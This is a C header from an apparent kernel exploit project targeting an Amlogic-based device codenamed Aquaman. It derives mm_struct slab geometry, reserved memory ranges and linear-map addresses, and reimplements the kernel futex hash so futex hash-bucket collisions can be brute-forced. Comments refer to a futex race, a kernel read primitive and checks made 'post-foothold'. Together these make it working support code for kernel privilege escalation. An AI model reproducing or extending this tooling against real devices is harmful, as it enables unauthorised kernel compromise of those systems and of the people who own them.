/*
 * ghostlock_mm_enum.h — Aquaman mm_struct physical enumerator (host only).
 *
 * No device execution. No reboot. No futex race. No reclaim. Host-side
 * geometry only.
 *
 * Provenance tags used below:
 *   CONFIRMED_AQUAMAN — device DTB / aquaman-config / arch source
 *   LAB_DERIVED       — build-aq DWARF + .src/linux-amlogic code read
 *   INFERRED          — derived but with an open boot-time hypothesis
 *   UNKNOWN           — placement/value cannot be closed statically
 * HAZEL_ONLY constants (0x1c0, 18, 0xc0000000..0xf0000000) are NOT used.
 */
#ifndef GHOSTLOCK_MM_ENUM_H
#define GHOSTLOCK_MM_ENUM_H

#include <stddef.h>
#include <stdint.h>

/* Physical DRAM usable window. CONFIRMED_AQUAMAN: artifacts/aquaman.dtb
 * /memory@00000000 linux,usable-memory = <0x0 0x100000 0x0 0x3ff00000>. */
#define AQ_PHYS_START  0x00100000ULL
#define AQ_PHYS_END    0x40000000ULL

/* Linear map base. CONFIRMED_AQUAMAN: aquaman-config VA_BITS=39,
 * arch/arm64/include/asm/memory.h PAGE_OFFSET for VA_BITS 39. */
#define AQ_PAGE_OFFSET 0xffffff8000000000ULL

/* SLUB geometry. LAB_DERIVED for sizes, INFERRED for order/objs (see below):
 *  sizeof 0x338: DWARF build-aq/vmlinux, guards agree with aquaman-config.
 *  align 0x40: slab_common.c:304 + cache_line 64 (A53 CWG=4, fallback
 *    L1_CACHE_BYTES=64 via CONFIG_AMLOGIC_MEMORY_EXTEND=y in both configs).
 *  stride 0x340: ALIGN(0x338,64) at slub.c:3501-3502; s->object_size stays
 *    0x338 (slab_common.c:341), s->inuse 0x338 (slub.c:3453).
 *  offset 0x0: LAB_DERIVED — only writer is slub.c:3455-3467 under
 *    SLAB_DESTROY_BY_RCU|SLAB_POISON|ctor, none of which apply to
 *    fork.c:2140 flags (HWCACHE_ALIGN|PANIC|NOTRACK|ACCOUNT, ctor NULL);
 *    create_cache uses kmem_cache_zalloc so offset starts zeroed;
 *    device has SLUB_DEBUG=n, KASAN=n, so no redzone/store_user path.
 *    SLAB_NOTRACK/SLAB_ACCOUNT evaluate to 0 (KMEMCHECK/MEMCG unset).
 *  order 2 / slab 0x4000 / objs 19: INFERRED — closed derivation from the
 *    ancestral tree + device config/DTB/cmdline, stock binary still sealed:
 *    slub_max_order defaults to PAGE_ALLOC_COSTLY_ORDER=3 (slub.c:3175,
 *    mmzone.h:36, Documentation/vm/slub.txt:120); stock cmdline
 *    (boot.img header) carries no slub params and no maxcpus/slab_nomerge;
 *    debug_guardpage_minorder() is 0 (CONFIG_DEBUG_PAGEALLOC=n);
 *    no vendor override of the order path (amlogic hooks only touch
 *    kmalloc_order large path + L1_CACHE_SHIFT);
 *    setup_nr_cpu_ids() runs before proc_caches_init() (init/main.c),
 *    DTB has 4 CPUs -> nr_cpu_ids=4 -> min_objects=4*(fls(4)+1)=16;
 *    max_objects=order_objects(3,0x340,0)=39; slab_order starts at
 *    get_order(16*832)=2, rem=576 <= 16384/16 -> order 2, 19 objs.
 *    Order 1 would require slub_max_order=1 on the cmdline (absent) and is
 *    REFUTED under every evidence-consistent scenario. Confirm on stock via
 *    /sys/kernel/slab/mm_struct/{slab_size,objs_per_slab,order} post-foothold. */
#define AQ_MM_SIZE       0x338ULL
#define AQ_MM_OBJECT_SIZE 0x338ULL
#define AQ_MM_ALIGN      0x40ULL
#define AQ_MM_STRIDE     0x340ULL
#define AQ_MM_OFFSET     0x0ULL
#define AQ_MM_ORDER      2
#define AQ_MM_SLAB_SIZE  0x4000ULL
#define AQ_MM_OBJS       19

/* Futex hash. LAB_DERIVED + CONFIRMED source: kernel/futex.c:391-397 in
 * .src/linux-amlogic matches upstream 4.9.113 byte for byte; union futex_key
 * is LP64 (word 8 + ptr 8 + offset 4). 4 words, NOT Hazel's 3-word model.
 * futex_hashsize 1024: INFERRED — 256*num_possible_cpus, 4 CPUs per DTB;
 * boot-time value via alloc_large_system_hash, readable only with kread. */
#define AQ_FUTEX_HASHMASK 0x3ffu
#define AQ_FUTEX_HASHSIZE 1024u

/* Reserve entry. Bases with reg/alloc-ranges are CONFIRMED_AQUAMAN from
 * artifacts/aquaman.dts. Floating CMA pools carry size only; base UNKNOWN
 * so the address enumerator cannot exclude them — see aq_slab_excluded. */
struct aq_reserve {
    const char *name;
    uint64_t base;   /* valid only if has_base */
    uint64_t size;
    int has_base;
    int excluded;    /* 1 = reject intersecting slabs */
    const char *origin;
};

static const struct aq_reserve aq_reserves[] = {
    { "ramoops",     0x07400000ULL, 0x200000ULL,  1, 1, "CONFIRMED_AQUAMAN" },
    { "secmon",      0x05000000ULL, 0x400000ULL,  1, 1, "CONFIRMED_AQUAMAN" },
    { "framebuffer", 0x3f800000ULL, 0x800000ULL,  1, 1, "CONFIRMED_AQUAMAN" },
    /* Floating CMA: size known, base UNKNOWN — listed but not address-excluded. */
    { "di_cma",      0, 0x2000000ULL, 0, 0, "UNKNOWN" },
    { "ion",         0, 0x4c00000ULL, 0, 0, "UNKNOWN" },
    { "vdin",        0, 0x1000000ULL, 0, 0, "UNKNOWN" },
    { "codec_mm",    0, 0xd000000ULL, 0, 0, "UNKNOWN" },
    /* linux,secos reg 0x05300000+0x2000000 no-map but status="disable":
     * CONFIRMED_AQUAMAN as disabled, must NOT be excluded. */
    { "secos(disabled)", 0x05300000ULL, 0x2000000ULL, 1, 0, "CONFIRMED_AQUAMAN" },
};
#define AQ_NRESERVES (sizeof(aq_reserves) / sizeof(aq_reserves[0]))

static inline int aq_add_overflow_u64(uint64_t a, uint64_t b, uint64_t *out)
{
    *out = a + b;
    return *out < a;
}

/* True if [base,base+size) overlaps [rbase,rbase+rsize), overflow-safe. */
static inline int aq_ranges_overlap(uint64_t base, uint64_t size,
                                    uint64_t rbase, uint64_t rsize)
{
    uint64_t base_end, r_end;

    if (size == 0 || rsize == 0)
        return 0;
    if (aq_add_overflow_u64(base, size, &base_end))
        return 1; /* overflow: treat as overlapping (defensive reject) */
    if (aq_add_overflow_u64(rbase, rsize, &r_end))
        return 0; /* bad table entry cannot match; table is static-correct */
    return base < r_end && rbase < base_end;
}

static inline int aq_slab_excluded(uint64_t slab_base)
{
    size_t i;

    for (i = 0; i < AQ_NRESERVES; i++) {
        if (!aq_reserves[i].excluded || !aq_reserves[i].has_base)
            continue;
        if (aq_ranges_overlap(slab_base, AQ_MM_SLAB_SIZE,
                              aq_reserves[i].base, aq_reserves[i].size))
            return 1;
    }
    return 0;
}

static inline int aq_phys_in_usable(uint64_t phys)
{
    return phys >= AQ_PHYS_START && phys < AQ_PHYS_END;
}

static inline uint64_t aq_phys_to_virt(uint64_t phys)
{
    return AQ_PAGE_OFFSET + phys;
}

static inline int aq_virt_in_linear(uint64_t vaddr)
{
    uint64_t lo = AQ_PAGE_OFFSET + AQ_PHYS_START;
    uint64_t hi = AQ_PAGE_OFFSET + AQ_PHYS_END;

    return vaddr >= lo && vaddr < hi;
}

/* Validate one slot. Returns 1 if usable, 0 otherwise. */
static inline int aq_slot_valid(uint64_t slab_base, uint64_t object_offset,
                                unsigned n, uint64_t *phys_out)
{
    uint64_t phys, slot_end, slab_end;

    if (object_offset >= AQ_MM_SLAB_SIZE)
        return 0;
    if (n >= AQ_MM_OBJS)
        return 0;
    if (aq_add_overflow_u64(slab_base, object_offset, &phys))
        return 0;
    if (n != 0) {
        uint64_t step = (uint64_t)n * AQ_MM_STRIDE;
        uint64_t tmp;

        if (step / AQ_MM_STRIDE != n)
            return 0;
        if (aq_add_overflow_u64(phys, step, &tmp))
            return 0;
        phys = tmp;
    }
    if (aq_add_overflow_u64(phys, AQ_MM_STRIDE, &slot_end))
        return 0;
    if (aq_add_overflow_u64(slab_base, AQ_MM_SLAB_SIZE, &slab_end))
        return 0;
    if (slot_end > slab_end)
        return 0;
    if (!aq_phys_in_usable(phys))
        return 0;
    if (phys_out)
        *phys_out = phys;
    return 1;
}

/* ---- Aquaman futex hash (4-word jhash2, kernel 4.9.113 hash_futex) ---- */
/* Preserved Aquaman implementation. NOT Hazel's 3-word ks_hash. */
static inline uint32_t aq_rol32(uint32_t v, unsigned n)
{
    return (v << n) | (v >> (32 - n));
}

static inline uint32_t aq_jhash2_u32(const uint32_t *k, uint32_t length,
                                     uint32_t initval)
{
    uint32_t a, b, c;

    a = b = c = 0xdeadbeefu + (length << 2) + initval;
    while (length > 3) {
        a += k[0];
        b += k[1];
        c += k[2];
        /* __jhash_mix */
        a -= c; a ^= aq_rol32(c, 4);  c += b;
        b -= a; b ^= aq_rol32(a, 6);  a += c;
        c -= b; c ^= aq_rol32(b, 8);  b += a;
        a -= c; a ^= aq_rol32(c, 16); c += b;
        b -= a; b ^= aq_rol32(a, 19); a += c;
        c -= b; c ^= aq_rol32(b, 4);  b += a;
        length -= 3;
        k += 3;
    }
    switch (length) {
    case 3: c += k[2];
        /* fall through */
    case 2: b += k[1];
        /* fall through */
    case 1: a += k[0];
        /* __jhash_final */
        c ^= b; c -= aq_rol32(b, 14);
        a ^= c; a -= aq_rol32(c, 11);
        b ^= a; b -= aq_rol32(a, 25);
        c ^= b; c -= aq_rol32(b, 16);
        a ^= c; a -= aq_rol32(c, 4);
        b ^= a; b -= aq_rol32(a, 14);
        c ^= b; c -= aq_rol32(b, 24);
        /* fall through */
    case 0:
        break;
    }
    return c;
}

/* Private futex: both.word = page-aligned user address (u64),
 * both.ptr = mm (u64 kernel VA), both.offset = page offset. */
static inline uint32_t aq_hash_private(uint64_t word, uint64_t mm,
                                       uint32_t offset)
{
    uint32_t k[4];

    k[0] = (uint32_t)(word & 0xffffffffu);
    k[1] = (uint32_t)((word >> 32) & 0xffffffffu);
    k[2] = (uint32_t)(mm & 0xffffffffu);
    k[3] = (uint32_t)((mm >> 32) & 0xffffffffu);
    return aq_jhash2_u32(k, 4, offset);
}

static inline uint32_t aq_hash_bucket(uint64_t word, uint64_t mm,
                                      uint32_t offset)
{
    return aq_hash_private(word, mm, offset) & AQ_FUTEX_HASHMASK;
}

/*
 * ks_solve_mm / brute force note (host design, not executed here):
 * iterate slab_base over [AQ_PHYS_START, AQ_PHYS_END) step AQ_MM_SLAB_SIZE,
 * skip aq_slab_excluded(), expand n=0..AQ_MM_OBJS-1 via aq_slot_valid(),
 * convert with aq_phys_to_virt() only after physical validation, then test
 * aq_hash_bucket() collisions. Never iterate 0xc0000000..0xf0000000.
 */

#endif /* GHOSTLOCK_MM_ENUM_H */
